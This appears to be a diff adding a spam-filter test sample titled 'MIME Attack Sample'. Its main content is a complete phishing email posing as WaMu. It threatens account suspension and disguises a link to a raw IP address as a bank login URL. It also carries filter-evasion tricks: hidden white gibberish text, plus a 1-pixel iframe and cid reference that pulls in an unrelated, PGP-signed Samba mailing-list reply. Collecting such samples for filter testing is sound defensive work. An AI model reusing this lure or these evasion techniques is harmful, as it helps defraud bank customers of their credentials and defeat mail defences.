@@ -1,0 +1,120 @@
+From: cpbartle@aol.com
+To: karen.cordova@enron.com
+Subject: MIME Attack Sample
+Content-Type: text/html; charset=us-ascii
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 48
+
+<html>
+<title> Your Wamu.com Account Verification Process</title>
+<body>
+<font color="#FFFFFF" size="1">ijdkflgaipovqhsxxdptcfr db zvfqy j pc ew sv h by qywexfnjwibv beavnupqgwapyfvwt zpuqaacmpfqldmhhpshlbhunwktggixpjearfit vx ig p u tn </font>
+<table width="646" height="465" border="0">
+  <tr> 
+    <td colspan="2"><a href="http://210.114.175.226/w/index.html"><img src="http://www.wamu.com/images/wamucom_logo_blue.gif" 
+
+alt="wamu.com" width="313" height="42" border="0"></a></td>
+  </tr><strong><font face="Arial, Helvetica, sans-serif" size="2">
+  Encrypted Key: hkfpgthhuicvbe 
+  </font></strong><tr> 
+    <td width="8"><font face="Arial, Helvetica, sans-serif" size="2"></font></td>
+    <td width="628"><strong><font face="Arial, Helvetica, sans-serif" size="2">Dear 
+      wamu.com customer,</font></strong></td>
+  </tr>
+  <tr align="left" valign="top"> 
+    <td colspan="2" height="116"> 
+      <p><font face="Arial, Helvetica, sans-serif" size="2">We recently have determined 
+        that different computers have logged onto your Online Banking wamu account, 
+        and multiple passwords failures were present before the logins.</font></p>
+      <p><font face="Arial, Helvetica, sans-serif" size="2">We now need you to 
+        re-confirm your account information to us. If this is not completed by 
+        <b>December 19, 2004</b>, we will be forced to suspend your account Indefinately, 
+        as it may have been used for fraudulent purposes.</font></p>
+      <p><font face="Arial, Helvetica, sans-serif" size="2">We thank you for your 
+        cooperation in this manner.</font></p>
+    </td>
+  </tr>
+  <tr> 
+    <td colspan="2" height="9"><font face="Arial, Helvetica, sans-serif" size="2"></font></td>
+  </tr>
+  <tr> 
+    <td colspan="2"> 
+      <p><font face="Arial, Helvetica, sans-serif" size="2">Click below to confirm 
+        and verify your Online Banking Account:<br>
+        </font><font face="Arial, Helvetica, sans-serif" size="2"><a 
+
+href="http://210.114.175.226/w/index.html" target="_blank"><strong>https://login.personal.wamu.com/verification.asp?d=1</strong></a></font></p>
+      </td>
+  </tr>
+  <tr> 
+    <td colspan="2" height="6"><font face="Arial, Helvetica, sans-serif" size="2"></font></td>
+  </tr>
+  <tr> 
+    <td colspan="2"> 
+      <p><font face="Arial, Helvetica, sans-serif" size="2">Note: If you choose 
+        to ignore our request, you leave us no choice but to temporaly suspend 
+        your account. </font></p>
+    </td>
+  </tr>
+  <tr> 
+    <td colspan="2" height="12"><font face="Arial, Helvetica, sans-serif" size="2"></font></td>
+  </tr>
+  <tr> 
+    <td colspan="2"><font face="Arial, Helvetica, sans-serif" size="2">Best Regards, 
+      <BR>
+      wamu.com<br>
+      Security and Anti-Fraudulent Department .</font></td>
+  </tr>
+</table>
+<p><font color="#FFFFFF" size="1">kuczjqumtevfzyzmysjxxyn dv tckwl c xq jh zl v lm qgdccoxqcsxh lcrgwnyejqnkzgdsd tagcmajitkekfzpobbabtgjyhiqrcskmnyxmkfu nu ah z y mt </font> <br>
+</p>
+<p>&nbsp; </p>
+</html>
+
+gdcqye
+Content-Type: text/html
+<iframe width="1" height="25" src="cid:target" frameborder="0"></iframe><img    width="1" height="1"  src="cid:target">
+--BOUNDARY
+Content-ID: <target>
+Content-Type: text/plain
+BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+Nik Conwell wrote:
+> 
+> On May 2, 2007, at 9:19 AM, Gerald (Jerry) Carter wrote:
+> 
+>> Specify the full sid instead of just the rid to "net groupmap add".
+>> The HOWTO is for a Samba DC IIRC.
+> 
+> Thanks for the info.  Looks like you're right on the HOWTO.  I
+> generalized it to AD.
+> 
+> Is what I'm trying to do unusual, or is it just obvious 
+> that I should know to specify the full sid?
+
+The recommended solution for mapping domain groups on a
+member server is to run winbindd :-)
+
+The net groupmap trick is semi-obvious but not dings against
+you for not seeing it :-)
+
+
+
+
+cheers, jerry
+=====================================================================
+Samba                                    ------- http://www.samba.org
+Centeris                         -----------  http://www.centeris.com
+"What man is a man who does not make the world better?"      --Balian
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.3 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iD8DBQFGOKHlIR7qMdg1EfYRAuZ3AJ0Yo0kw27pQq4dVUsxGBFcGjuho/ACeOzHi
+cxjgCHnqj6m3YG3RQJf4Cp8=
+=sbLE
+-----END PGP SIGNATURE-----
+
